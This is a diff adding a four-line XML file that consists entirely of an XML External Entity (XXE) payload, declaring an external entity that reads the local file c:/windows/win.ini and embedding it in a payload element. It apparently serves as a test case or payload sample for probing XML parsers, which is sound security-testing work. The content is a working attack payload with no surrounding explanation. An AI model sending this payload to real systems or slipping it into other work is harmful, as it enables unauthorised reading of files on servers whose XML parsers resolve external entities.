@@ -1,0 +1,4 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+<root>
+<payload>&xxe;</payload>
+</root>
